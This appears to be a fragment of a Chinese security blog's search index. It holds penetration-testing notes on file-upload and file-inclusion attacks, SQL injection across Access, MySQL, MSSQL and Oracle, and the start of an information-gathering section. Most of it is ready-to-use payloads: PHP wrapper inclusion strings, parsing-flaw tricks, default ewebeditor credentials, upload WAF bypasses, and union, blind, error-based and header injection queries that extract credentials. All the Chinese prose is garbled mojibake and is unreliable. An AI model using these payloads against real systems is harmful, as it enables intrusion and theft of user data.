title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h4><p>ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶ä¸”ä¸å—allow_url_fopenï¼Œallow_url_includeå½±å“</p><blockquote><p>?file&#x3D;file:&#x2F;&#x2F;æ–‡ä»¶ç»å¯¹è·¯å¾„</p></blockquote><h4 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p>éœ€è¦allow_url_include&#x3D;onï¼Œå¯ä»¥å†™æ–‡ä»¶ï¼Œç†è®ºä¸Šå¯ä»¥æ‰§è¡Œä»»ä½•phpä»£ç ï¼Œå†™å…¥å†…å®¹éœ€è¦ç”¨postæ–¹å¼æäº¤</p><h4 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p>åªæ˜¯è¯»å–ï¼Œå°†æ–‡ä»¶ä¸­çš„æ•°æ®è¿›è¡Œbase64åŠ å¯†ä¹‹åå†è¾“å‡ºã€‚æ‰€ä»¥åªéœ€è¦allow_url_fopen&#x3D;on</p><blockquote><p>index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;head.php</p></blockquote><h4 id="data-text-x2F-plain"><a href="#data-text-x2F-plain" class="headerlink" title="data:text&#x2F;plain"></a>data:text&#x2F;plain</h4><p>éœ€è¦allow_url_fopen&#x3D;onï¼Œallow_url_include&#x3D;on </p><blockquote><p>?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo();?&gt;</p><p>?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgIHBocGluZm8oKTsgPz4&#x3D;</p></blockquote><h4 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h4><p>è¯¥åè®®éœ€è¦å°†#ç¼–è¯‘ä¸º%23ï¼Œæ‰€ä»¥éœ€è¦PHP çš„ç‰ˆæœ¬&gt; &#x3D;5.3.0ï¼Œè¦æ˜¯å› ä¸ºç‰ˆæœ¬çš„é—®é¢˜æ— æ³•å°†#ç¼–ç æˆ%23ï¼Œå¯ä»¥æ‰‹åŠ¨æŠŠ#æ”¹æˆ%23</p><blockquote><p>file&#x3D;zip:&#x2F;&#x2F;æ–‡ä»¶è·¯å¾„(ç»å¯¹è·¯å¾„ç›¸å¯¹è·¯å¾„éƒ½å¯ä»¥)å‹ç¼©æ–‡ä»¶å%23å‹ç¼©æ–‡ä»¶å†…çš„æ–‡ä»¶å</p></blockquote><h2 id="00æˆªæ–­"><a href="#00æˆªæ–­" class="headerlink" title="00æˆªæ–­"></a>00æˆªæ–­</h2><p>%00æˆªæ–­ï¼Œphpç‰ˆæœ¬åº”å°äº5.3.4(æœºå™¨ç 00ä¸ºåœæ­¢)</p><p>GETä¼ å‚æ—¶ï¼Œç›´æ¥åœ¨urlæ·»åŠ %00å³å¯ï¼›è‹¥ä¸ºPOSTä¼ å‚ï¼Œåˆ™éœ€è¦æŠ“åŒ…é€šè¿‡åå…­è¿›åˆ¶åœ¨ç›¸åº”ä½ç½®å¡«å……00</p><h2 id="æ¡ä»¶ç«äº‰"><a href="#æ¡ä»¶ç«äº‰" class="headerlink" title="æ¡ä»¶ç«äº‰"></a>æ¡ä»¶ç«äº‰</h2><p>å½¢æˆåŸå› ï¼ŒæœåŠ¡ç«¯å¯¹ä¸Šä¼ çš„æ–‡ä»¶å…ˆä¿å­˜å†æ ¡éªŒæ˜¯å¦åˆæ³•ã€‚åªè¦æˆ‘ä»¬è®¿é—®çš„é€Ÿåº¦æ¯”åˆ é™¤çš„é€Ÿåº¦å¿«å°±å¯ä»¥æˆåŠŸçš„è®¿é—®åˆ°è¯¥æ–‡ä»¶</p><h2 id="è§£ææ¼æ´"><a href="#è§£ææ¼æ´" class="headerlink" title="è§£ææ¼æ´"></a>è§£ææ¼æ´</h2><h3 id="IIS6-0è§£ææ¼æ´"><a href="#IIS6-0è§£ææ¼æ´" class="headerlink" title="IIS6.0è§£ææ¼æ´"></a>IIS6.0è§£ææ¼æ´</h3><h4 id="ç›®å½•è§£æ"><a href="#ç›®å½•è§£æ" class="headerlink" title="ç›®å½•è§£æ"></a>ç›®å½•è§£æ</h4><p>è‹¥ç›®å½•ä¸ºä¸ºâ€xxx.aspâ€ï¼Œé‚£ä¹ˆè¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶éƒ½å°†è¢«ä½œä¸ºaspæ–‡ä»¶è§£æ</p><p>ä¸Šä¼ æ—¶æŠ“åŒ…æ”¹æ–‡ä»¶ä¸Šä¼ çš„ç›®å½•ï¼Œæ”¹ä¸ºèƒ½è§£æçš„ç›®å½•å</p><h4 id="æ–‡ä»¶åè§£æ"><a href="#æ–‡ä»¶åè§£æ" class="headerlink" title="æ–‡ä»¶åè§£æ"></a>æ–‡ä»¶åè§£æ</h4><p>.asp;.jpgåƒè¿™ç§ç•¸å½¢æ–‡ä»¶ååœ¨â€œï¼›â€åé¢çš„ç›´æ¥è¢«å¿½ç•¥ï¼Œä¹Ÿå°±æ˜¯è¯´å½“æˆ.aspæ–‡ä»¶æ‰§è¡Œ</p><h3 id="IIS7-0-x2F-7-5è§£ææ¼æ´ã€Nginx-lt-8-03"><a href="#IIS7-0-x2F-7-5è§£ææ¼æ´ã€Nginx-lt-8-03" class="headerlink" title="IIS7.0&#x2F;7.5è§£ææ¼æ´ã€Nginx&lt;8.03"></a>IIS7.0&#x2F;7.5è§£ææ¼æ´ã€Nginx&lt;8.03</h3><p>æ­£å¸¸ä¸Šä¼ æ–‡ä»¶ï¼Œè®¿é—®æ—¶åœ¨åé¢åŠ ä¸Š &#x2F;.phpï¼Œè¯¥æ–‡ä»¶ä¼šå½“æˆPHPæ¥è§£æã€‚éœ€è¦phpé…ç½®æ–‡ä»¶é€‰é¡¹<strong>cgi.fix_pathinfo&#x3D;1</strong>å¼€å¯ã€‚ï¼ˆåœ¨ä¸¥æ ¼æ„ä¹‰ä¸Šï¼Œè¿™ä¸ªå±äºPHPçš„CGIæ¼æ´ï¼‰</p><h3 id="Apacheè§£ææ¼æ´"><a href="#Apacheè§£ææ¼æ´" class="headerlink" title="Apacheè§£ææ¼æ´"></a>Apacheè§£ææ¼æ´</h3><p>Apacheé‡åˆ°æœªçŸ¥æ–‡ä»¶æ‹“å±•åæ—¶ï¼Œä¼šç»§ç»­å·¦ç§»è¯†åˆ«ã€‚</p><h2 id="IIS-PUT"><a href="#IIS-PUT" class="headerlink" title="IIS PUT"></a>IIS PUT</h2><p>IISå»ºè®¾ä¸­çš„ç½‘ç«™ä¹Ÿå¯ä»¥åˆ©ç”¨ï¼Œè¿™äº›æœåŠ¡å™¨å¯èƒ½å¹¶éä¸ºæ­å»ºç½‘ç«™ä½œç”¨ï¼ˆç½‘ç«™è¦æœ‰å†™å…¥æƒé™ä»¥åŠå…è®¸webDAVæœåŠ¡æ‹“å±•ï¼‰</p><p>è¯·æ±‚æ–¹æ³•putï¼šå°†æ•°æ®å‘é€åˆ°æœåŠ¡å™¨ä»¥åˆ›å»ºæˆ–æ›´æ–°èµ„æºï¼Œå­˜åœ¨åˆ™æ›´æ”¹ï¼Œä¸å­˜åœ¨åˆ™åˆ›å»º</p><p>ä½¿ç”¨å·¥å…·æ¡‚æ—è€å…µä¸Šä¼ æ–‡æœ¬æ ¼å¼çš„æœ¨é©¬ï¼Œé€šè¿‡moveæ–¹å¼ä¿®æ”¹æ–‡ä»¶åç¼€åæ¥è§£æ</p><h2 id="åˆ©ç”¨CMSåŠŸèƒ½ä¸Šä¼ "><a href="#åˆ©ç”¨CMSåŠŸèƒ½ä¸Šä¼ " class="headerlink" title="åˆ©ç”¨CMSåŠŸèƒ½ä¸Šä¼ "></a>åˆ©ç”¨CMSåŠŸèƒ½ä¸Šä¼ </h2><p>æœ‰äº›cmsä¼šæœ‰å•ç‹¬çš„ç¼–è¾‘å™¨åå°ï¼Œä¸ªåˆ«åœ¨ç¼–è¾‘å¤„æŸ¥çœ‹æºç å¯ä»¥æ˜¾ç¤ºåå°åœ°å€ï¼Œewebeditorç¼–è¾‘å™¨ï¼Œè´¦å·å¯†ç é»˜è®¤ä¸ºadmin adminï¼Œè‹¥ä¿®æ”¹åï¼Œå¯åˆ°ç›®å½•&#x2F;db&#x2F;ç›´æ¥ä¸‹è½½æ•°æ®åº“æŸ¥çœ‹</p><p>é€šè¿‡åå°å¯å†™å…¥å¤„å†™å…¥æœ¨é©¬ï¼Œå†ç”¨cmsçš„æœ¨é©¬æ‰«æï¼Œå†æ›¿æ¢å†…å®¹</p><h2 id="æœªæˆæƒä¸Šä¼ "><a href="#æœªæˆæƒä¸Šä¼ " class="headerlink" title="æœªæˆæƒä¸Šä¼ "></a>æœªæˆæƒä¸Šä¼ </h2><p>åœ¨æœ¬åœ°æ„å»ºä¸€ä¸ªhtmlçš„åŒ…ï¼Œå¯ä»¥ç›´æ¥ä¸Šä¼ æ–‡ä»¶ï¼ˆå¤šè§äºbcï¼‰</p><h2 id="ç»•wafä¸Šä¼ "><a href="#ç»•wafä¸Šä¼ " class="headerlink" title="ç»•wafä¸Šä¼ "></a>ç»•wafä¸Šä¼ </h2><p>Contentâ€”Dispositionåæ·»åŠ åƒåœ¾å­—ç¬¦ï¼ˆæˆ–å…¶ä»–åœ°æ–¹ï¼‰ï¼Œåˆ é™¤filenameæœ€åçš„å¼•å·ï¼Œå†…å®¹æ¢è¡Œï¼ŒåŒå†™filename&#x3D;</p><p>è‹¥ä¸Šä¼ æˆåŠŸï¼Œä½†æ— æ³•é“¾æ¥æœ¨é©¬ï¼Œå¯ä»¥ç”¨base64åŠ å¯†å†…å®¹ï¼Œå¹¶åœ¨èšå‰‘ä¸Šåˆ›å»ºç¼–è¾‘å™¨å¹¶æ›´æ¢agentå¤´è¿æ¥</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlæ³¨å…¥</title>
      <link href="/2022/03/24/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/03/24/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="accessè”åˆæŸ¥è¯¢"><a href="#accessè”åˆæŸ¥è¯¢" class="headerlink" title="accessè”åˆæŸ¥è¯¢"></a>accessè”åˆæŸ¥è¯¢</h1><p>aspä¸€èˆ¬æ­é…accessã€aspxä¸€èˆ¬æ­é…mssqlã€phpä¸€èˆ¬æ­é…mysql</p><p>accessåªæœ‰ä¸€ä¸ªæ•°æ®åº“ï¼Œä¸ç”¨çˆ†åº“å</p><p>order by (&#x3D;&#x3D;-&#x3D;&#x3D;) çŒœå­—æ®µæ•°</p><p>union select â€¦â€¦,&#x3D;&#x3D;çˆ†ä¿¡æ¯&#x3D;&#x3D;,â€¦â€¦ from ï¼ˆ&#x3D;&#x3D;è¦æŸ¥çš„è¡¨å&#x3D;&#x3D;ï¼‰</p><p>å¯ä»¥é€šè¿‡åå°ç™»é™†é¡µé¢çš„æºä»£ç æŸ¥çœ‹è´¦å·ä»¥åŠå¯†ç çš„å¯èƒ½çš„å­—æ®µå</p><h1 id="accessç›²æ³¨"><a href="#accessç›²æ³¨" class="headerlink" title="accessç›²æ³¨"></a>accessç›²æ³¨</h1><p>&#x3D;&#x3D;ï¼ˆselect countï¼ˆ*ï¼‰from msysobjects)&gt;0&#x3D;&#x3D;</p><p>msysobjects accessçš„ä¸“å±è¡¨åï¼Œåœ¨webä¸­è®¿é—®æ²¡æœ‰æƒé™ï¼Œä¼šæŠ¥é”™ã€‚å¦‚æœæ²¡æŠ¥é”™è¯´æ˜æ•°æ®åº“æ˜¯mssqlçš„</p><p>&lt;&gt;(select coount(*)from &#x3D;&#x3D;è¦çŒœçš„è¡¨å&#x3D;&#x3D;)</p><p>é€šè¿‡å›æ˜¾åˆ¤æ–­è¦æŸ¥è¯¢çš„è¡¨åæ˜¯å¦å­˜åœ¨</p><p>(select count(*)from &#x3D;&#x3D;è¦çŒœçš„è¡¨å&#x3D;&#x3D;)&#x3D; &#x3D;&#x3D;-&#x3D;&#x3D;</p><p>åˆ¤æ–­è¡¨å†…æ•°æ®æœ‰å‡ è¡Œ</p><p>1&#x3D;(select count(*)from &#x3D;&#x3D;è¡¨å&#x3D;&#x3D; where len (&#x3D;&#x3D;å­—æ®µå&#x3D;&#x3D;)&gt;0)</p><p>åˆ¤æ–­å­—æ®µåæ˜¯å¦å­˜åœ¨</p><p>(select top 1 asc(mid(&#x3D;&#x3D;å­—æ®µå&#x3D;&#x3D; 1,1))from &#x3D;&#x3D;è¡¨å&#x3D;&#x3D;)&#x3D; &#x3D;&#x3D;-&#x3D;&#x3D;</p><p>åˆ¤æ–­top 1(ç¬¬ä¸€è¡Œ),æˆªå–ç¬¬ä¸€ä¸ªæ•°æ®çš„ASCIIç æ˜¯å¤šå°‘</p><h1 id="mysqlè”åˆæŸ¥è¯¢"><a href="#mysqlè”åˆæŸ¥è¯¢" class="headerlink" title="mysqlè”åˆæŸ¥è¯¢"></a>mysqlè”åˆæŸ¥è¯¢</h1><p>å­—ç¬¦å‹è¦é—­åˆå•å¼•å·ï¼Œæœ‰é­”æœ¯å¼•å·å°±è½¬ç </p><p>order by &#x3D;&#x3D;*&#x3D;&#x3D;çŒœå­—æ®µæ•°</p><p>union select â€¦,&#x3D;&#x3D;çˆ†ä¿¡æ¯&#x3D;&#x3D;,â€¦    #user() çˆ†æƒé™ï¼›#database() çˆ†å½“å‰æ•°æ®åº“åï¼›#version() çˆ†æ•°æ®åº“ç‰ˆæœ¬</p><p>union select â€¦,group_concat(table_name),â€¦ from information_schema.tables where table_schema&#x3D; â€˜&#x3D;&#x3D;æ•°æ®åº“å&#x3D;&#x3D;â€™  #çˆ†è¡¨å </p><p>union select â€¦,group_concat(column_name),â€¦ from information_schema.columns where table_name&#x3D; â€˜&#x3D;&#x3D;åˆ—å&#x3D;&#x3D;â€™  #çˆ†åˆ—å</p><p>union select â€¦â€¦,&#x3D;&#x3D;çˆ†å†…å®¹&#x3D;&#x3D;,â€¦â€¦ from ï¼ˆ&#x3D;&#x3D;æŸ¥å‡ºçš„åˆ—å&#x3D;&#x3D;ï¼‰</p><p>##æŸ¥è¯¢å…¶ä»–æ•°æ®åº“çš„æ•°æ®</p><p>union select â€¦,group_concat(schema_name),â€¦ from information_schema.schemata  æŸ¥æ•°æ®åº“ </p><p>union select â€¦,group_concat(&#x3D;&#x3D;å­—æ®µå†…å®¹&#x3D;&#x3D;),â€¦ from &#x3D;&#x3D;åº“å&#x3D;&#x3D;.&#x3D;&#x3D;è¡¨å&#x3D;&#x3D;æŸ¥å­—æ®µå†…å®¹</p><h1 id="mysql-cookieæ³¨å…¥"><a href="#mysql-cookieæ³¨å…¥" class="headerlink" title="mysql-cookieæ³¨å…¥"></a>mysql-cookieæ³¨å…¥</h1><p>and 1&#x3D;2 æ˜¯ä¸ºäº†è®©å‰é¢çš„æŸ¥è¯¢ä¸ºç©ºï¼Œè¿™æ ·æ‰èƒ½æ˜¾ç¤ºåé¢çš„æ•°æ®</p><h1 id="mysqlç›²æ³¨"><a href="#mysqlç›²æ³¨" class="headerlink" title="mysqlç›²æ³¨"></a>mysqlç›²æ³¨</h1><p>lengthã€substrã€asciièƒ½åœ¨æ‹¬å·å†…ä¹Ÿèƒ½åœ¨æ‹¬å·å¤–ä½¿ç”¨</p><p>å¸¸ç”¨å‡½æ•° exists() ascii() substr() ord() mid() length() left() regexp()</p><p>ä½¿ç”¨ä¾‹å­ substr(â€˜rootâ€™,1,3)</p><p>mid(â€˜rootâ€™,1,3)</p><p>mid å’Œ substr æ˜¯ä¸€æ ·çš„</p><p>ord å’Œ ascii æ˜¯ä¸€æ ·çš„</p><p>and (select length(user) from users limit 0,1)&gt;0 &#x3D;  and length((select user from users limit 0,1))&gt;0</p><p>1â€™ and (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema&#x3D;â€™dvwaâ€™ limit 0,1)&gt;0#</p><p>and database()&#x3D;â€™dvwaâ€™#</p><p>and length(database())&#x3D; &#x3D;&#x3D;4&#x3D;&#x3D;#  çˆ†æ•°æ®åº“é•¿åº¦</p><p>and ascii(substr(database(),&#x3D;&#x3D;4&#x3D;&#x3D;,1))&#x3D;â€™&#x3D;&#x3D;97&#x3D;&#x3D;â€™ #  é€å­—çˆ†åº“</p><p>and ( select count(table_name) from information_schema.tables where table_schema&#x3D;â€™dvwaâ€™)&#x3D; &#x3D;&#x3D;2&#x3D;&#x3D;#  åˆ¤æ–­æ•°æ®åº“å†…æœ‰å¤šå°‘ä¸ªè¡¨ è¿™é‡Œå¯ä»¥ç”¨*ä»£æ›¿table_name</p><p> and length((select table_name from information_schema.tables where table_schema&#x3D;â€™dvwaâ€™ limit &#x3D;&#x3D;0&#x3D;&#x3D;,1))&gt; &#x3D;&#x3D;0&#x3D;&#x3D;#  çˆ†è¡¨åé•¿åº¦</p><p> and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;â€™dvwaâ€™ limit 0,1),2,1))&gt;0#  é€å­—æŠ¥è¡¨</p><p>and (select count(columns_name) from information_schema.columns where table_name&#x3D;â€™usersâ€™)&#x3D;15# åˆ¤æ–­è¡¨å†…æœ‰å¤šå°‘åˆ—</p><p>and length((select column_name from information_schema.columns where table_name&#x3D;â€™usersâ€™ limit 0,1))&gt;0# åˆ¤æ–­åˆ—åé•¿åº¦</p><p>and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;â€™usersâ€™ limit 0,1),1,1))&gt;0# é€å­—çˆ†åˆ—</p><p>and (select count(&#x3D;&#x3D;user&#x3D;&#x3D;) from &#x3D;&#x3D;users&#x3D;&#x3D;)&gt;0#  çŒœå­—æ®µå†…æœ‰å¤šå°‘æ•°æ®</p><p>and (select length(&#x3D;&#x3D;user&#x3D;&#x3D;) from &#x3D;&#x3D;users&#x3D;&#x3D; limit 0,1)&gt;0# çŒœæ•°æ®é•¿åº¦</p><p>and ascii(substr((select user from users limit 0,1),1,1))&gt;0# é€å­—çˆ†æ•°æ®å†…å®¹</p><h1 id="å»¶æ—¶æ³¨å…¥-å®½å­—èŠ‚æ³¨å…¥"><a href="#å»¶æ—¶æ³¨å…¥-å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å»¶æ—¶æ³¨å…¥+å®½å­—èŠ‚æ³¨å…¥"></a>å»¶æ—¶æ³¨å…¥+å®½å­—èŠ‚æ³¨å…¥</h1><p>å»¶æ—¶æ³¨å…¥è·Ÿå¸ƒå°”å·®ä¸å¤šï¼Œå°±å¤šäº†sleepï¼ˆï¼‰</p><p>å®½å­—èŠ‚æ³¨å…¥åŠ å…¥å®½å­—èŠ‚å°±è¡Œ</p><p>%df</p><h1 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h1><p>è¿™ä¸‰ä¸ªå‡½æ•°éƒ½èƒ½ä½¿ç”¨</p><p>select extractvalue(1,concat(â€˜<del>â€˜,(select database()),â€™</del>â€˜))</p><p>select updatexml(1,concat(â€˜~â€™,(select database())),1)</p><p>select count(*),concat((select database()),0x7e,floor(rand(0)*2))x from information_schema.tables group by x</p><h1 id="x-forwarded-forå¤´æ³¨å…¥"><a href="#x-forwarded-forå¤´æ³¨å…¥" class="headerlink" title="x-forwarded-forå¤´æ³¨å…¥"></a>x-forwarded-forå¤´æ³¨å…¥</h1><p>127.0.0.1â€™, updataxml (1,concat(0x7e, (select user() ),0x7e ),1 ) #  çˆ†ç”¨æˆ·æƒé™</p><p>127.0.0.1â€™, updataxml (1, concat (0x7e,(select database() ) , 0x7e ) ,1) #  çˆ†æ•°æ®åº“</p><p>127.0.0.1â€™, and updataxml (1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D; &#x3D;&#x3D;database()&#x3D;&#x3D; limit 0,1), 0x7e),1)#  è·å–ç¬¬ä¸€ä¸ªè¡¨å</p><p>127.0.0.1â€™, and updataxml (1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D; &#x3D;&#x3D;database()&#x3D;&#x3D; and  table_name&#x3D; &#x3D;&#x3D;â€™usersâ€™&#x3D;&#x3D; limit 0,1), 0x7e),1)#  è·å–ç¬¬ä¸€ä¸ªå­—æ®µå</p><p>127.0.0.1â€™, updataxml (1,concat(0x7e, (select concat (username, password) from user limit 0,1), 0x7e ), 1 ) #  çˆ†å­—æ®µå†…å®¹</p><h1 id="mssqlæ³¨å…¥"><a href="#mssqlæ³¨å…¥" class="headerlink" title="mssqlæ³¨å…¥"></a>mssqlæ³¨å…¥</h1><p>order by &#x3D;&#x3D;4&#x3D;&#x3D;</p><p>and 1&#x3D;2 union all select null,â€™nullâ€™,null,null</p><p>and 1&#x3D;2 union all select null,â€™2â€™,â€™3â€™,null</p><p>åŠ allèƒ½æ˜¾ç¤ºé‡å¤å†…å®¹ï¼Œmssqlçš„å­—æ®µåˆ†æ•°æ®ç±»å‹ï¼Œæ‰€ä»¥è¦ç”¨å•å¼•å·åˆ¤æ–­æ˜¾ç¤ºä½</p><p>and 1&#x3D;2 union all select null,(select db_name()),null,null  çˆ†æ•°æ®åº“å</p><p>and 1&#x3D;2 union all select null,(select @@version),null,null  çˆ†æ•°æ®åº“ç‰ˆæœ¬</p><p> and 1&#x3D;2 union all select null,(select top 1 from &#x3D;&#x3D;æ•°æ®åº“å&#x3D;&#x3D;.dbo.sysobjects where xtype&#x3D;â€™uâ€™),null,null</p><p>çˆ†è¡¨åï¼Œmssqlæ²¡æœ‰limitï¼Œç”¨top1è¡¨ç¤ºç¬¬ä¸€ä¸ªï¼ˆä¸æ‡‚ä¸ºä»€ä¹ˆè¦åŠ top1???)ï¼Œ sysobjectsç±»ä¼¼äºmysqlé‡Œçš„information_schemaï¼Œxtype&#x3D;â€™sâ€™æ˜¯ç³»ç»Ÿè‡ªå¸¦çš„è¡¨ï¼Œä¸€èˆ¬æŸ¥è¯¢xtype&#x3D;â€™uâ€™è¿™æ˜¯ç”¨æˆ·åˆ›å»ºçš„è¡¨ï¼Œdboåº”è¯¥æ˜¯è¡¨ç¤ºè·å–è·¯å¾„æ˜¯æ•°æ®åº“å§</p><p> and 1&#x3D;2 union all select null,(select top 1 col_name(objects_id(â€˜&#x3D;&#x3D;è¡¨å&#x3D;&#x3D;â€™),&#x3D;&#x3D;3&#x3D;&#x3D;)from sysobjects),null,null</p><p>çˆ†åˆ—åï¼Œobjects_idæ¯ä¸€ä¸ªå­—æ®µè¯¥å€¼æ˜¯å”¯ä¸€çš„ï¼Œå¹¶ä¸”è¯¥å€¼åªå¯¹åº”ç”¨æˆ·åˆ›å»ºçš„è¡¨ï¼Œä¸å¯¹åº”ç³»ç»Ÿåˆ›å»ºçš„, è¯¥å‡½æ•°ä¼šè¿”å›æŒ‡å®šå¯¹è±¡çš„idå€¼</p><p>å¤§å®¶éƒ½çŸ¥é“åœ¨æ•°æ®åº“ä¸­æœ‰ä¸€ä¸ªç³»ç»Ÿè¡¨sysobjectsï¼Œé‡Œé¢å­˜å‚¨äº†æ•°æ®åº“å„ä¸ªå¯¹è±¡çš„ä¿¡æ¯ã€‚å¯ä»¥æŸ¥è¯¢ä¸‹çœ‹çœ‹ç»“æœã€‚å¯ä»¥çœ‹å‡ºæ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªIDï¼Œè¿™ä¸ªè¡¨å­˜å‚¨äº†è¡¨ï¼Œå­˜å‚¨è¿‡ç¨‹ï¼Œè§¦å‘å™¨ï¼Œè§†å›¾ç­‰ç›¸å…³ä¿¡æ¯ã€‚æ³¨æ„ï¼šå­—æ®µæ²¡æœ‰ã€‚</p><p> object_idå°±æ˜¯æ ¹æ®å¯¹è±¡åç§°è¿”å›è¯¥å¯¹è±¡çš„id.<br> object_nameæ˜¯æ ¹æ®å¯¹è±¡idè¿”å›å¯¹è±¡åç§°.<br> select object_id(å¯¹è±¡å)ç­‰åŒäº:<br> select id from sysobjects where name&#x3D;å¯¹è±¡åã€‚                                       select object_name(idå·)ç­‰åŒäº:<br> select name from sysobjects where id&#x3D;idå·</p><p>and 1&#x3D;2 union all select null,(select top 1 &#x3D;&#x3D;username&#x3D;&#x3D; from &#x3D;&#x3D;åˆ—å&#x3D;&#x3D;),null,null</p><p>çˆ†å­—æ®µ</p><h1 id="oracleæ³¨å…¥"><a href="#oracleæ³¨å…¥" class="headerlink" title="oracleæ³¨å…¥"></a>oracleæ³¨å…¥</h1><p>oracleæœ€é«˜æƒé™DBA</p><p>ç®¡ç†å‘˜ç”¨æˆ·system </p><p>order by&#x3D;&#x3D;2&#x3D;&#x3D;</p><p>çˆ†å­—æ®µ</p><p>and 1&#x3D;2 union select null,â€™nullâ€™ from dual</p><p>and 1&#x3D;2 union select null,â€™&#x3D;&#x3D;2&#x3D;&#x3D;â€™ from &#x3D;&#x3D;dual&#x3D;&#x3D;</p><p>è·Ÿmssqlä¸€æ ·ï¼Œå­—æ®µéƒ½åˆ†æ•°æ®ç±»å‹ï¼ŒoracleæŸ¥è¯¢è¦è·Ÿè¡¨åï¼Œdualæ˜¯oracleä¸­é™„å¸¦çš„ä¸€å¼ è™šæ‹Ÿè¡¨</p><p>and 1&#x3D;2 union select null,(select sys_context(â€˜userenvâ€™,â€™current_userâ€™)from dual) from dual</p><p>çˆ†æ•°æ®åº“å½“å‰ç”¨æˆ·</p><p>and 1&#x3D;2 union select null,(select instance_name from V$INSTANCE) from dual</p><p>çˆ†æ•°æ®åº“å</p><p>and 1&#x3D;2 union select null,(select banner from sys.v_$version where rownum&#x3D;1) from dual</p><p>çˆ†æ•°æ®åº“ç‰ˆæœ¬ï¼Œå› ä¸ºæ¯æ¬¡åªèƒ½å›æ˜¾ä¸€æ¡æ•°æ®ï¼Œæ‰€ä»¥è¦åŠ where rownum&#x3D;1</p><p>and 1&#x3D;2 union select null,(select table_name where rownum&#x3D;1 and &#x3D;&#x3D;table_name like â€˜%user%â€™&#x3D;&#x3D;) from dual</p><p>çˆ†è¡¨åï¼Œtable_name like â€˜%user%â€™ç›¸å½“äºæ£€ç´¢äºusersæœ‰å…³çš„è¡¨</p><p>and 1&#x3D;2 union select null,(select column_name from user_tab_name where table_name&#x3D;â€™&#x3D;&#x3D;user&#x3D;&#x3D;â€™ and rounum&#x3D;1) from dual</p><p>and 1&#x3D;2 union select null,(select column_name from user_tab_name where table_name&#x3D;â€™&#x3D;&#x3D;user&#x3D;&#x3D;â€™ and rounum&#x3D;1 and column_name not in(â€˜&#x3D;&#x3D;username&#x3D;&#x3D;â€™)) from dual</p><p>çˆ†åˆ—åï¼Œcolumn_name not in(â€˜&#x3D;&#x3D;username&#x3D;&#x3D;â€™)ä¸ºæ’é™¤æŸ¥è¯¢è¿‡çš„åˆ—å</p><p>and 1&#x3D;2 union select username,password from â€œusersâ€ &#x3D;&#x3D;where user &lt;&gt; â€˜adminâ€™&#x3D;&#x3D;</p><p>çˆ†å­—æ®µï¼Œ where user &lt;&gt; â€˜adminâ€™ ï¼Œä¸ºæ’é™¤å·²æŸ¥è¯¢çš„ä¿¡æ¯&lt;&gt;æ˜¯ä¸ç­‰äº</p><h1 id="wafç»•è¿‡"><a href="#wafç»•è¿‡" class="headerlink" title="wafç»•è¿‡"></a>wafç»•è¿‡</h1><p>æ‰€æœ‰wafæ€è·¯éƒ½å·®ä¸å¤šï¼Œå†…è”æ³¨é‡ŠåŠ ç¼–ç æ¢è¡Œè¿™æ˜¯å¸¸ç”¨çš„ï¼Œå¦å¤–è¿˜æœ‰æ›¿æ¢å¸¸ç”¨å‡½æ•°ç­‰æ–¹æ³•ï¼Œè¿™ä¸ªåé¢æœ‰æ—¶é—´ä¼šæ›´æ–°</p>]]></content>
      
      
      
        <tags>
            
            <tag> sqlæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¿¡æ¯æ”¶é›†</title>
      <link href="/2022/02/27/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2022/02/27/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¿¡æ¯æ”¶é›†æ¦‚è¦"><a href="#ä¿¡æ¯æ”¶é›†æ¦‚è¦" class="headerlink" title="ä¿¡æ¯æ”¶é›†æ¦‚è¦"></a>ä¿¡æ¯æ”¶é›†æ¦‚è¦</h1><p>whoisæ”¶é›†ç½‘ç«™ç®¡ç†ä¿¡æ¯ä¾‹å¦‚é‚®ç®±</p><p>æŸ¥çœ‹ç½‘ç«™æ˜¯å¦æœ‰CDN</p><p>æŸ¥çœ‹ç½‘ç«™cmsï¼ˆæŒ‡çº¹ï¼‰</p><p>ç½‘ç«™æ—æ®µã€cæ®µ</p><p>CDNç»•è¿‡</p><h2 id="åˆ¤æ–­ç½‘ç«™æ˜¯å¦å­˜åœ¨CDN"><a href="#åˆ¤æ–­ç½‘ç«™æ˜¯å¦å­˜åœ¨CDN" class="headerlink" title="åˆ¤æ–­ç½‘ç«™æ˜¯å¦å­˜åœ¨CDN"></a>åˆ¤æ–­ç½‘ç«™æ˜¯å¦å­˜åœ¨CDN</h2><p>å…¨çƒping</p><p>cdmå‘½ä»¤è¡ŒæŒ‡ä»¤ï¼šnslookup</p><h2 